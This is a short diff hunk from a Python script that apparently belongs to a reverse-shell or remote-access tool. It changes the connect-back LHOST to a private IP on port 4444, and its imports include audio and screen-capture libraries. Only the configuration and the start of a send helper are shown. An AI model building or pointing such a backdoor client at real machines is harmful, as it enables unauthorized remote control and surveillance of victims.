@@ -14,7 +14,7 @@ import pyaudio
 import pyautogui
 import termcolor
 
-LHOST = "127.0.0.1";PORT = 4444
+LHOST = "192.168.234.130";PORT = 4444
 
 def reliable_send(data):
     jsondata = json.dumps(data)
